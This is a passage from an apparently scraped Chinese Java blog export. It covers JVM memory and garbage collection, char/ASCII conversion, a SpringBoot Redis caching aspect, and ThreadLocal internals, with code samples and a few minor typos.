主要负责加载 jre/lib/ext 目录下的一些扩展的 jar。 BootStrap ClassLoader 根类加载器 主要负责加载核心的类库 (java.lang.* 等) 加载过程：class File =&gt; Loading 加载 =&gt; Linking （验证，准备，解析） 链接 =&gt; Initialization 初始化 # 双亲委派机制 从上图中我们就更容易理解了，当一个 Hello.class 这样的文件要被加载时。不考虑我们自定义类加载器，首先会在 AppClassLoader 中检查是否加载过，如果有那就无需再加载了。如果没有，那么会拿到父加载器，然后调用父加载器的 loadClass 方法。父类中同理也会先检查自己是否已经加载过，如果没有再往上。注意这个类似递归的过程，直到到达 Bootstrap classLoader 之前，都是在检查是否加载过，并不会选择自己去加载。直到 BootstrapClassLoader，已经没有父加载器了，这时候开始考虑自己是否能加载了，如果自己无法加载，会下沉到子加载器去加载，一直到最底层，如果没有任何加载器能加载，就会抛出 ClassNotFoundException。那么有人就有下面这种疑问了？ 为什么要设计这种机制 这种设计有个好处是，如果有人想替换系统级别的类：String.java。篡改它的实现，在这种机制下这些系统的类已经被 Bootstrap classLoader 加载过了（为什么？因为当一个类需要加载的时候，最先去尝试加载的就是 BootstrapClassLoader），所以其他类加载器并没有机会再去加载，从一定程度上防止了危险代码的植入。 沙箱安全机制 在 Java 中将执行程序分成本地代码和远程代码两种，本地代码默认视为可信任的，而远程代码则被看作是不受信的。对于授信的本地代码，可以访问一切本地资源。而对于非授信的远程代码在早期的 Java 实现中，安全依赖于沙箱 (Sandbox) 机制。 当前最新的安全机制实现，则引入了域 (Domain) 的概念。虚拟机会把所有代码加载到不同的系统域和应用域，系统域部分专门负责与关键资源进行交互，而各个应用域部分则通过系统域的部分代理来对各种需要的资源进行访问。虚拟机中不同的受保护域 (Protected Domain)，对应不一样的权限 (Permission)。存在于不同域中的类文件就具有了当前域的全部权限，如下图所示 # Native native 即 JNI,Java Native Interface Native 关键字是 JNI，也就是 java 本地方法接口，用来调用本地方法库，可以调用本地方法中的 C 语言代码 # PC 寄存器 每次线程启动的时候会创建一个 PC 寄存器，保存正在执行的 JVM 指令地址，每个线程都有自己的 PC 寄存器，是一个比较小的内存空间，是为一个一个不会出现 OutOfMemoryError 的内存区域，它的生命周期随着线程的创建而创建，随着线程的结束而死亡。 # 方法区 Hotspot 虚拟机，方法区别称：non-heap（非堆），其实就是存储堆类型的数据，而不占据堆内存的空间 方法区和堆区线程共享，方法区大小和堆一样，可以选择固定大小或者拓展 方法区大小决定了系统可以保存多少个类，如果系统定义了太多的类，导致方法区溢出，虚拟机同样会抛出内存溢出错误。 关闭 JVM 就会释放这个区域的内存 设置方法区的内存大小： # JDK1.7 之前： -XX：PermSize 设置永久代初始分配空间 默认是 20.75m -XX：MaxPermSize 设置最大永久代分配空间，32 位机器默认 64m，64 位机器默认 82m # JDK1.8 及以后：永久代被元空间代替（MetaSpace） 元空间大小可以用参数：-XX:MetaspaceSzie 和 -XX:MaxMetaspaceSize 指定 -XX:MetaspaceSzie 默认 21.75m -XX:MaxMetaspaceSize 默认 - 1 没有限制 默认情况下，虚拟机会耗尽所有可用的系统内存，如果元空间发生溢出，虚拟机照样会抛出 OOM 如果初始高位线设置过低，通过垃圾回收器日志可以观察到 Full GC 多次调用，为了避免频繁 GC， 建议将 - XX:MetaspaceSize 设置为一个相对较高的值。 # 栈：数据结构 程序 = 数据结构 + 算法 先进后出，后进先出 栈是桶的概念：先进去的后出来，后进去的先出来 栈有压栈、弹栈 队列是管道概念：先进先出 (F I F O) ，后进后出 First Input First Out 喝多了吐就是栈，吃多了拉就是队列 栈：主管程序运行，生命周期和线程同步； main 主线程结束，栈内存也就释放了，对于栈来说，不存在垃圾回收问题，一旦线程结束，栈就 Over 了。 栈存什么东西： 八大基本数据类型 + 对象的引用地址 + 实例方法 栈运行原理：栈帧：方法索引，输入输出参数，本地变量，类引用，父帧，子帧 栈满了就会抛出错误 Error：StackOverflowError 栈溢出 # 堆：Heap ​ 一个 JVM 只有一个堆内存，堆内存大小是可以调节的。 ​ 类加载器读取的类文件后，一般会把：类，方法，常量，变量，引用类型的真实对象放到堆中。 ​ 堆内存还要细分为三个区域：{ 新生代：Eden Space： Survior0 区和 Survior1 区：幸存者 0/1 区 经过新生代的轻 GC 15 次的考验进入老年代。 老年代：重量级 Full GC 垃圾回收 永久代：（1.8 移除） GC 垃圾回收集中在新生代和老年代执行。 假设内存满了，爆出 OOM，堆内存溢出。 内存溢出代码怎么写： 利用 while 循环一个字符串无限 += 随机数 JDK8 以后，永久代被移除，更名为元空间：MetaSpace } # 详解： # 新生代： ​ 类：诞生成长的地方，也可能类死亡的地方 ​ Eden 区、幸存者 0 和 1 区， ​ 所有对象都是在 Eden 区 new 出来的 ​ Eden 区没死亡的对象在幸存者区存活 ​ 如果 Eden 区存储触发了轻 GC 回收机制，就会对 Eden 区进行清除，存活下来对象在幸存区，清除的对象会消失。当 Eden 区和幸存者区都满了之后会执行一次 Full GC，再次存活下来的对象会进入老年代。 Tips：新生代 99% 都是临时对象！，能进入老年代的对象并不多。所以平时很少见到 OOM 的错误 # 老年代： 每次发生轻 GC 会对新生代进行对象清理，当新生代和幸存区的对象在轻 GC 清除下存活 15 次之后，进入老年代 永久代：用来存放 jdk 自身携带的 calss 对象，interface 元数据，存储的是运行的一些时环境，永久代不存在垃圾回收，关闭 JJVM 虚拟机就会释放永久代内存。 假设一个启动类，加载了大量的第三方 jar 包，或者一个 tomcat 部署了太多应用，或者大量动态生成的反射类，如果不断的加载，可能会导致永久代内存溢出。 jdk1.6 之前：永久代，常量池存在于方法区中 jdk1.7：去永久代，常量池在堆中 jdk1.8：无永久代，常量池在元空间中 元空间： （方法区）：非堆 非堆指的是空间上，不属于堆空间；但是由于存储的内容，特性上又被称为堆 默认情况下：虚拟机被分配到的总内存是电脑内存的 1/4 ，而初始化的内存只有 1/64 因为与堆共享内存，逻辑上存在，物理上不存在 dump 文件～Jprofiler 插件 -Xms : 初始化内存 -Xmx : 最大内存 -XX:+PrintGCDetails 打印 GC 回收的详细信息 -XX:+HeapDumpOnOutOfMemoryError 发生 OOM 异常打印 dump 内存快照 -XX:MaxTenuringReshlod 设置最大存活时间，默认是 15 次 GC：垃圾回收 JVM 在进行 GC 时：大部分回收都在新生代，并不是三个区都回收 新生代 幸存区（form、to）Survior0、Survior1 区 老年代 GC 两个种类：轻 GC（GC）、重 GC（Full GC） 轻 GC 对新生代和幸存区进行回收 重 GC 进行全局回收 如何区分 from 和 to 区：谁空谁是 to 区 1 . 每次 GC 都会将 Eden 区活的对象移到幸存区中：一旦 Eden 区被 GC 后，就会是空的！ 2 . 当一个对象经历了 15 次 GC，还没有死，就会进入老年代 -XX:MaxTenuringReshold，通过这个参数可以设定进入老年代的时间（指定在 0~15 次之间） # 常用算法： **1 . 标记清除 ** 分为两步骤：标记 ---- 清除 标记：扫描，对存活的对象进行标记 清除：扫描，对没有标记的对象进行清除 优点：简单，成功率高 缺点：两次扫描严重耗时，清除会产生内存碎片 2 . 标记压缩（标记 — 清除 — 压缩） 标记清除的优化版：防止内存碎片产生 在标记清除基础上，再次扫描，向一端移动仍存活的对象，清除另一外的碎片 优点：在标记清除优点上优化了内存碎片 缺点：对于标记清除又多了一次移动成本，时间增加 3 . 复制算法（新生代主要用的复制算法） 把 from 区向 to 区复制一份，然后清空 from 区，这时 from 区会变成 to 区，复制过去的 to 区变成 from 区等待回收。 优点：没有内存碎片 缺点：浪费内存空间（多了一半空间永远是 to 区，假设对象 100% 存活）极端情况下不适用 复制算法最佳使用场景：对象存活度较低的时候，新生区使用复制算法！ 4 . 分代收集算法： ​ 由于每个收集算法都无法符合所有的场景，就好比每个对象所在的内存阶段不一样，被回收的概率也不一样，比如在新生代，基本 90% 的对象会被回收，而到了老年代则一半以上的对象存活，所以针对不同的场景，回收的策略也就不一样，所以引出了分代收集算法，根据新生代和老年代不同的场景下使用不同的算法，比如新生代用复制算法，老年代则用标记整理算法 5. 引用计数器（不高效） 给每个对象设置计数器，只要有引用就会计数，当一个对象计数器为 0 时，进行回收。缺点：效率低下，现在基本不用 # 总结： 内存效率：复制算法 &gt; 标记清除算法 &gt; 标记压缩（时间复杂度） 内存整齐度：复制算法 == 标记压缩算法 &gt; 标记清除算法 内存利用率：标记压缩算法 == 标记清除算法 &gt; 复制算法 // 思考一个问题：难道没有最优算法吗？ 答案：永远不能有最优算法。只有最合适的算法。 GC：分代收集算法：根据每个代需求来配置不同算法 年轻代：存活率低：需求时间短：所以用复制算法 老年代：存活率高、区域大：标记清除 + 标记压缩混合 内存碎片不是很多就标记清除，内存碎片太多就用压缩 JMM： 1 . 什么是 JMM：Java 内存模型（Java Memory Model） 2 . JMM 作用： 3 . 如何学习： 经历过很多面试大部分都会问一句： 你知道 Java 内存模型么？ 然后我就 pulapula 的说一大堆什么堆呀，栈呀，GC 呀什么的，这段时间把 JVM 虚拟机和多线程编程完整的学习了一遍，发现 JMM 和堆 / 栈这些完全不是一个概念，不知道是不是就是因为这才被拒了十来次的 / 尴尬。 JVM 是 Java 实现的虚拟计算机（Java Virtual Machine），对于熟悉计算机结构的同学，我感觉把这些概念和物理机对应起来更好理解。 JVM 对应的就是物理机，它有存放数据的存储区：堆、栈等由 JVM 管理的内存（对应于物理机的内存）、执行数据计算的执行单元：线程（对应于物理机的 CPU）、加速线程执行的本次存储区：可能会从存储区里分配一块空间来存储线程本地数据，比如栈（对应于物理机的 cache）。 众所周知，现代计算机一般都会包含多个处理器，多个处理器共享主内存。为了提升性能，会在每个处理器上增加一个小容量的 cache 加速数据读写。cache 会导致了缓存一致性问题，为了解决缓存一致性问题又引入了一系列 Cache 一致性协议（比如 MSI、MESI、MOSI、Synapse、Firefly 及 Dragon Protocol）来解决 CPU 本地缓存和主内存数据不一致问题。 而 JVM 中管理下的存储空间（包括堆、栈等）就对应与物理机的内存； 线程本次存储区（例如栈）就对应于物理机的 cache； 而 JMM 就对应于类似于 MSI、MESI、MOSI、Synapse、Firefly 及 Dragon Protocol 这样的缓存一致性协议，用于定义数据读写的规则。 JMM 相对于物理机的缓存一致性协议来说它还要处理 JVM 自身特有的问题：重排序问题，参见： http://cmsblogs.com/?p=2116。 那么 JMM 都有哪些内容呢？ 官方文档： http://101.96.10.64/www.cs.umd.edu/~pugh/java/memoryModel/CommunityReview.pdf 通俗理解就是 happens-before 原则 https://www.cnblogs.com/chenssy/p/6393321.html # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/06/11/%E3%80%90Java%E3%80%91JVM%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%AC%94%E8%AE%B0/"},{"title":"【Java】Java字符与ASCII码互转","text":"# 【Java】Java 字符与 ASCII 码互转 字符转对应 ASCII 码 12345678// 方法一：将char强制转换为bytechar ch = 'A';byte byteAscii = (byte) ch;System.out.println(byteAscii);// 方法二：将char直接转化为int，其值就是字符的asciiint byteAscii1 = (int) ch;System.out.println(byteAscii1); ASCII 码转字符 1234// 直接int强制转换为charint ascii = 65;char ch1 = (char)ascii;System.out.println(ch1); 应用实例 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576import java.util.HashMap;import java.util.Map;import java.util.Scanner;import java.util.regex.Pattern;/** * HJ21 简单密码 * * 描述 * 现在有一种密码变换算法。 * 九键手机键盘上的数字与字母的对应： 1--1， abc--2, def--3, ghi--4, jkl--5, mno--6, pqrs--7, tuv--8 wxyz--9, 0--0，把密码中出现的小写字母都变成九键键盘对应的数字，如：a 变成 2，x 变成 9. * 而密码中出现的大写字母则变成小写之后往后移一位，如：X ，先变成小写，再往后移一位，变成了 y ，例外：Z 往后移是 a 。 * 数字和其它的符号都不做变换。 * 数据范围： 输入的字符串长度满足 1≤n≤100 * 输入描述： * 输入一组密码，长度不超过100个字符。 * * 输出描述： * 输出密码变换后的字符串 * * 示例1 * 输入： * YUANzhi1987 * 输出： * zvbo9441987 */public class HJ21Test { public static void main(String[] args) { Scanner scanner = new Scanner(System.in); String input = scanner.next(); Map&lt;Integer, String&gt; map = new HashMap&lt;&gt;(); map.put(1, &quot;1&quot;); map.put(2, &quot;abc&quot;); map.put(3, &quot;def&quot;); map.put(4, &quot;ghi&quot;); map.put(5, &quot;jkl&quot;); map.put(6, &quot;mno&quot;); map.put(7, &quot;pqrs&quot;); map.put(8, &quot;tuv&quot;); map.put(9, &quot;wxyz&quot;); map.put(0, &quot;0&quot;); char[] chars = input.toCharArray(); int length = chars.length; StringBuilder builder = new StringBuilder(); for (int i = 0; i &lt; length; i++) { int finalI = i; map.forEach((k, v) -&gt; { if (v.contains(String.valueOf(chars[finalI]))) { builder.append(k); } }); int u = chars[finalI]; if (u &gt;= 65 &amp;&amp; u &lt;= 90) { int i1 = u + 33; if (i1 == 123 ) { builder.append(&quot;a&quot;); } else { char ch = (char) (u + 33); builder.append(ch); } } Pattern pattern = Pattern.compile(&quot;[2-9]&quot;); if (pattern.matcher(String.valueOf(chars[finalI])).matches()) { builder.append(chars[i]); } } System.out.println(builder); }} 运行结果 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/02/23/%E3%80%90Java%E3%80%91Java%E5%AD%97%E7%AC%A6%E4%B8%8EASCII%E7%A0%81%E4%BA%92%E8%BD%AC/"},{"title":"【Java】SpringBoot 整合Redis对查询数据做缓存（ 利用Spring的AOP技术）","text":"# 【Java】SpringBoot 整合 Redis 对查询数据做缓存（ 利用 Spring 的 AOP 技术） # 本篇主要介绍 SpringBoot 整合 Redis 做数据缓存，利用的是 SpringAop 切面编程技术，利用注解标识切面。 # 这里不再介绍 spring boot 操作数据库，有兴趣的话，我最后会给出源码链接 # 一，引入依赖 12345678910&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-aop&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-redis&lt;/artifactId&gt; &lt;version&gt;1.3.2.RELEASE&lt;/version&gt;&lt;/dependency&gt;12345678910 # 二，配置 redis 连接 配置文件我里这用的是 yml 格式的，tab 缩进，如果是 properties 格式的，请自己改造 redis 安装请参考 Redis 安装 windows 管理工具可以用 RedisDesktopManager，测试的时候，可以直接删除缓存。 1234567891011121314151617181920spring: redis: database: 0 ## Redis服务器地址 host: 127.0.0.1.128 ## Redis服务器连接端口 port: 6379 ## Redis服务器连接密码（默认为空） password: ## 连接超时时间（毫秒） timeout: 0 ## 连接池最大连接数（使用负值表示没有限制） pool: max-active: 8 ## 连接池最大阻塞等待时间（使用负值表示没有限制） max-wait: -1 ## 连接池中的最大空闲连接 max-idle: 8 ## 连接池中的最小空闲连接 min-idle: 01234567891011121314151617181920 # 三，注解 注解 QueryCache 用来标识查询数据库的方法，参数 nameSpace 用来区分应用的，后面会用来添加到缓存的 key 中。比如，登陆应用缓存的数据 key 值全部都是 sso 开头。 123456789101112131415package com.example.common.annotation;import com.example.common.CacheNameSpace;import java.lang.annotation.*;/** * @author Brath */@Retention(RetentionPolicy.RUNTIME)@Target({ElementType.METHOD})@Documentedpublic @interface QueryCache { CacheNameSpace nameSpace();} 注解 QueryCacheKey 是方法级别的注解，用来标注要查询数据的主键，会和上面的 nameSpace 组合做缓存的 key 值 12345678910111213package com.example.common.annotation;import java.lang.annotation.*;/** * @author Brath */@Retention(RetentionPolicy.RUNTIME)@Target({ElementType.PARAMETER})@Documentedpublic @interface QueryCacheKey {} 枚举 CacheNameSpace 用来保存 nameSpace 的 12345678package com.example.common;/** * @author Brath */public enum CacheNameSpace { SSO_USER} 下面就是组合起来的用法，userMapper.findById (id) 是用来查询数据库的方法 1234567@QueryCache(nameSpace = CacheNameSpace.SSO_USER)public UserInfo findUserById(@QueryCacheKey Long id) { UserInfo userInfo = userMapper.findById(id); return userInfo;} # 四，Aop 切面 下面是重点，代码中的注释已经很多了，应该能看的懂，如有问题，可以留言。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101package com.example.common.aspect;import com.example.common.CacheNameSpace;import com.example.common.annotation.QueryCache;import com.example.common.annotation.QueryCacheKey;import org.apache.commons.lang3.StringUtils;import org.aspectj.lang.ProceedingJoinPoint;import org.aspectj.lang.annotation.Around;import org.aspectj.lang.annotation.Aspect;import org.aspectj.lang.annotation.Pointcut;import org.aspectj.lang.reflect.MethodSignature;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.core.MethodParameter;import org.springframework.core.annotation.SynthesizingMethodParameter;import org.springframework.data.redis.core.RedisTemplate;import org.springframework.data.redis.core.ValueOperations;import org.springframework.stereotype.Service;import javax.annotation.Resource;import java.lang.annotation.Annotation;import java.lang.reflect.Method;import java.util.concurrent.TimeUnit;/** * @author Brath */@Aspect@Servicepublic class DBCacheAspect { private static final Logger LOGGER = LoggerFactory.getLogger(DBCacheAspect.class); @Resource private RedisTemplate redisTemplate; /** * 定义拦截规则：拦截所有@QueryCache注解的方法。 */ /*@Pointcut(&quot;execution(* com.example.service.impl..*(..)) , @annotation(com.example.common.annotation.QueryCache)&quot;) public void queryCachePointcut(){}*/ @Pointcut(&quot;@annotation(com.example.common.annotation.QueryCache)&quot;) public void queryCachePointcut(){} /** * 拦截器具体实现 * @param pjp * @return * @throws Throwable */ @Around(&quot;queryCachePointcut()&quot;) public Object Interceptor(ProceedingJoinPoint pjp) throws Throwable { long beginTime = System.currentTimeMillis(); LOGGER.info(&quot;AOP 缓存切面处理 &gt;&gt;&gt;&gt; start &quot;); MethodSignature signature = (MethodSignature) pjp.getSignature(); Method method = signature.getMethod(); //获取被拦截的方法 CacheNameSpace cacheType = method.getAnnotation(QueryCache.class).nameSpace(); String key = null; int i = 0; // 循环所有的参数 for (Object value : pjp.getArgs()) { MethodParameter methodParam = new SynthesizingMethodParameter(method, i); Annotation[] paramAnns = methodParam.getParameterAnnotations(); // 循环参数上所有的注解 for (Annotation paramAnn : paramAnns) { if ( paramAnn instanceof QueryCacheKey) { // QueryCacheKey requestParam = (QueryCacheKey) paramAnn; key = cacheType.name() + &quot;_&quot; + value; // 取到QueryCacheKey的标识参数的值 } } i++; } // 获取不到key值，抛异常 if (StringUtils.isBlank(key)) throw new Exception(&quot;缓存key值不存在&quot;); LOGGER.info(&quot;获取到缓存key值 &gt;&gt;&gt;&gt; &quot; + key); ValueOperations&lt;String, Object&gt; operations = redisTemplate.opsForValue(); boolean hasKey = redisTemplate.hasKey(key); if (hasKey) { // 缓存中获取到数据，直接返回。 Object object = operations.get(key); LOGGER.info(&quot;从缓存中获取到数据 &gt;&gt;&gt;&gt; &quot; + object.toString()); LOGGER.info(&quot;AOP 缓存切面处理 &gt;&gt;&gt;&gt; end 耗时：&quot; + (System.currentTimeMillis() - beginTime)); return object; } // 缓存中没有数据，调用原始方法查询数据库 Object object = pjp.proceed(); operations.set(key, object, 30, TimeUnit.MINUTES); // 设置超时时间30分钟 LOGGER.info(&quot;DB取到数据并存入缓存 &gt;&gt;&gt;&gt; &quot; + object.toString()); LOGGER.info(&quot;AOP 缓存切面处理 &gt;&gt;&gt;&gt; end 耗时：&quot; + (System.currentTimeMillis() - beginTime)); return object; }} # 五，测试 1234@Testpublic void testFindById(){ UserInfo userInfo = userService.findUserById(210001L);} # 六，执行结果 两张图对比一下很明显，从 redis 缓存中取数据耗时要少的多。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/07/03/%E3%80%90Java%E3%80%91SpringBoot%20%E6%95%B4%E5%90%88Redis%E5%AF%B9%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%81%9A%E7%BC%93%E5%AD%98%EF%BC%88%20%E5%88%A9%E7%94%A8Spring%E7%9A%84AOP%E6%8A%80%E6%9C%AF%EF%BC%89/"},{"title":"ThreadLocal","text":"# ThreadLocal 详解 ThreadLocal 概述 ThreadLocal 类用来提供线程内部的局部变量，不同的线程之间不会相互干扰 这种变量在多线程环境下访问（通过 get 和 set 方法访问）时能保证各个线程的变量相对独立于其他线程内的变量 在线程的生命周期内起作用，可以减少同一个线程内多个函数或组件之间一些公共变量传递的复杂度 使用 常用方法 方法名 描述 ThreadLocal() 创建 ThreadLocal 对象 public void set( T value) 设置当前线程绑定的局部变量 public T get() 获取当前线程绑定的局部变量 public T remove() 移除当前线程绑定的局部变量，该方法可以帮助 JVM 进行 GC protected T initialValue() 返回当前线程局部变量的初始值 案例 场景：让每个线程获取其设置的对应的共享变量值 共享变量访问问题案例 123456789101112131415161718192021222324252627282930313233/** * 线程间访问共享变量之间问题 * */public class DemoQuestion { private String name; private int age; public static void main(String[] args) { DemoQuestion demoQuestion = new DemoQuestion(); for (int i = 0; i &lt; 5; i++) { // int j = i; new Thread(() -&gt;{ // demoQuestion.setAge(j); demoQuestion.setName(Thread.currentThread().getName() + &quot;的数据&quot;); System.out.println(&quot;=================&quot;); System.out.println(Thread.currentThread().getName() + &quot;---&gt;&quot; + demoQuestion.getName()); // System.out.println(Thread.currentThread().getName() + &quot;---&gt;&quot; + demoQuestion.getAge()); },&quot;t&quot; + i).start(); } } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; }} 使用关键字 Synchronized 关键字加锁解决方案 12345678910111213141516171819202122232425262728293031323334/** * 使用加锁的方式解决：线程间访问共享变量之间问题 * 将对共享变量的操作进行加锁，保证其原子性 * */public class SolveDemoQuestionBySynchronized { private String name; private int age; public static void main(String[] args) { SolveDemoQuestionBySynchronized demoQuestion = new SolveDemoQuestionBySynchronized(); for (int i = 0; i &lt; 5; i++) { // int j = i; new Thread(() -&gt;{ synchronized (SolveDemoQuestionBySynchronized.class){ demoQuestion.setName(Thread.currentThread().getName() + &quot;的数据&quot;); System.out.println(&quot;=================&quot;); System.out.println(Thread.currentThread().getName() + &quot;---&gt;&quot; + demoQuestion.getName()); } },&quot;t&quot; + i).start(); } } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; }} 使用 ThreadLocal 方式解决 123456789101112131415161718192021222324252627public class SolveDemoQuestionByThreadLocal { private ThreadLocal&lt;String&gt; name = new ThreadLocal&lt;&gt;(); private int age; public static void main(String[] args) { SolveDemoQuestionByThreadLocal demoQuestion = new SolveDemoQuestionByThreadLocal(); for (int i = 0; i &lt; 5; i++) { new Thread(() -&gt;{ demoQuestion.setName(Thread.currentThread().getName() + &quot;的数据&quot;); System.out.println(&quot;=================&quot;); System.out.println(Thread.currentThread().getName() + &quot;---&gt;&quot; + demoQuestion.getName()); },&quot;t&quot; + i).start(); } } public String getName() { return name.get(); } private void setName(String content) { name.set(content); } public int getAge() { return age; } public void setAge(int age) { this.age = age; }} # ThreadLocalMap 内部结果 JDK8 之前的设计 每个 ThreadLocal 都创建一个 ThreadLocalMap，用线程作为 ThreadLocalMap 的 key，要存储的局部变量作为 ThreadLocalMap 的 value，这样就能达到各个线程的局部变量隔离的效果 JDK8 之后的设计 每个 Thread 维护一个 ThreadLocalMap，这个 ThreadLocalMap 的 key 是 ThreadLocal 实例本身，value 才是真正要存储的值 Object 每个 Thread 线程内部都有一个 ThreadLocalMap Map 里面存储 ThreadLocal 对象（key）和线程的变量副本（value） Thread 内部的 Map 是由 ThreadLocal 维护的，由 ThreadLocal 负责向 map 获取和设置线程的变量值 对于不同的线程，每次获取副本值时，别的线程并不能获取到当前线程的副本值，形成了副本的隔离，互不干扰 JDK 对 ThreadLocal 这样改造的好处 减少 ThreadLocalMap 存储的 Entry 数量：因为之前的存储数量由 Thread 的数量决定，现在是由 ThreadLocal 的数量决定。在实际运用当中，往往 ThreadLocal 的数量要少于 Thread 的数量 当 Thread 销毁之后，对应的 ThreadLocalMap 也会随之销毁，能减少内存的使用（但是不能避免内存泄漏问题，解决内存泄漏问题应该在使用完后及时调用 remove () 对 ThreadMap 里的 Entry 对象进行移除，由于 Entry 继承了弱引用类，会在下次 GC 时被 JVM 回收） # ThreadLocal 相关方法源码解析 # set 方法 源码及相关注释 123456789101112131415161718192021222324252627282930313233343536373839 /** * 设置当前线程对应的ThreadLocal的值 * @param value 将要保存在当前线程对应的ThreadLocal的值 */ public void set(T value) { // 获取当前线程对象 Thread t = Thread.currentThread(); // 获取此线程对象中维护的ThreadLocalMap对象 ThreadLocalMap map = getMap(t); // 判断map是否存在 if (map != null) // 存在则调用map.set设置此实体entry,this这里指调用此方法的ThreadLocal对象 map.set(this, value); else // 1）当前线程Thread 不存在ThreadLocalMap对象 // 2）则调用createMap进行ThreadLocalMap对象的初始化 // 3）并将 t(当前线程)和value(t对应的值)作为第一个entry存放至ThreadLocalMap中 createMap(t, value); }/** * 获取当前线程Thread对应维护的ThreadLocalMap * * @param t the current thread 当前线程 * @return the map 对应维护的ThreadLocalMap */ ThreadLocalMap getMap(Thread t) { return t.threadLocals; } /** *创建当前线程Thread对应维护的ThreadLocalMap * @param t 当前线程 * @param firstValue 存放到map中第一个entry的值 */void createMap(Thread t, T firstValue) { //这里的this是调用此方法的threadLocal t.threadLocals = new ThreadLocalMap(this, firstValue); } 相关流程图 执行流程 获取当前线程，并根据当前线程获取一个 Map 如果获取的 Map 不为空，则将参数设置到 Map 中（当前 ThreadLocal 的引用作为 key） 如果 Map 为空，则给该线程创建 Map，并设置初始值 # get () 方法 源码及相关注释 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/** * 返回当前线程中保存ThreadLocal的值 * 如果当前线程没有此ThreadLocal变量， * 则它会通过调用{@link #initialValue} 方法进行初始化值 * @return 返回当前线程对应此ThreadLocal的值 */ public T get() { // 获取当前线程对象 Thread t = Thread.currentThread(); // 获取此线程对象中维护的ThreadLocalMap对象 ThreadLocalMap map = getMap(t); // 如果此map存在 if (map != null) { // 以当前的ThreadLocal 为 key，调用getEntry获取对应的存储实体e ThreadLocalMap.Entry e = map.getEntry(this); // 对e进行判空 if (e != null) { @SuppressWarnings(&quot;unchecked&quot;) // 获取存储实体 e 对应的 value值,即为我们想要的当前线程对应此ThreadLocal的值 T result = (T)e.value; return result; } } /* 初始化 : 有两种情况有执行当前代码 第一种情况: map不存在，表示此线程没有维护的ThreadLocalMap对象 第二种情况: map存在, 但是没有与当前ThreadLocal关联的entry */ return setInitialValue(); } /** * 初始化 * @return the initial value 初始化后的值 */ private T setInitialValue() { // 调用initialValue获取初始化的值 // 此方法可以被子类重写, 如果不重写默认返回null T value = initialValue(); // 获取当前线程对象 Thread t = Thread.currentThread(); // 获取此线程对象中维护的ThreadLocalMap对象 ThreadLocalMap map = getMap(t); // 判断map是否存在 if (map != null) // 存在则调用map.set设置此实体entry map.set(this, value); else // 1）当前线程Thread 不存在ThreadLocalMap对象 // 2）则调用createMap进行ThreadLocalMap对象的初始化 // 3）并将 t(当前线程)和value(t对应的值)作为第一个entry存放至ThreadLocalMap中 createMap(t, value); // 返回设置的值value return value; } 流程图 执行流程 获取当前线程，根据当前线程获取一个 Map 如果获取的 Map 不为空，则在 Map 中以 ThreadLocal 的引用作为 key 来在 Map 中获取对应的 Entrye，否则转到 4 如果 e 不为 null，则返回 e.value，否则转到 4 Map 为空或者 e 为空，则通过 initialValue 函数获取初始值 value，然后用 ThreadLocal 的引用和 value 作为 firstKey 和 firstValue 创建一个新的 Map # remove 方法 源码及相关注释 123456789101112/** * 删除当前线程中保存的ThreadLocal对应的实体entry */ public void remove() { // 获取当前线程对象中维护的ThreadLocalMap对象 ThreadLocalMap m = getMap(Thread.currentThread()); // 如果此map存在 if (m != null) // 存在则调用map.remove // 以当前ThreadLocal为key删除对应的实体entry m.remove(this); } 执行流程 首先获取当前线程，并根据当前线程获取一个 Map 如果获取的 Map 不为空，则移除当前 ThreadLocal 对象对应的 entry initialValue 方法 此方法的作用是返回该线程局部变量的初始值 这个方法是一个延迟调用方法，从上面的代码我们得知，在 set 方法还未调用而先调用了 get 方法时才执行，并且仅执行 1 次 这个方法缺省实现直接返回一个 null 如果想要一个除 null 之外的初始值，可以重写此方法。（备注： 该方法是一个 protected 的方法，显然是为了让子类覆盖而设计的） 源码及相关注释 12345678910111213141516/** * 返回当前线程对应的ThreadLocal的初始值 * 此方法的第一次调用发生在，当线程通过get方法访问此线程的ThreadLocal值时 * 除非线程先调用了set方法，在这种情况下，initialValue 才不会被这个线程调用。 * 通常情况下，每个线程最多调用一次这个方法。 * * &lt;p&gt;这个方法仅仅简单的返回null {@code null}; * 如果想ThreadLocal线程局部变量有一个除null以外的初始值， * 必须通过子类继承{@code ThreadLocal} 的方式去重写此方法 * 通常, 可以通过匿名内部类的方式实现 * * @return 当前ThreadLocal的初始值 */protected T initialValue() { return null;} ThreadLocalMap 解析 # 内部结构 ThreadLocalMap 是 ThreadLocal 的内部类，没有实现 Map 接口，用独立的方式实现了 Map 的功能，其内部的 Entry 也是独立实现的，而 Entry 又是 ThreadLocalMap 的内部类，且集成弱引用 (WeakReference) 类。 # 成员变量 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 /** * The entries in this hash map extend WeakReference, using * its main ref field as the key (which is always a * ThreadLocal object). Note that null keys (i.e. entry.get() * == null) mean that the key is no longer referenced, so the * entry can be expunged from table. Such entries are referred to * as &quot;stale 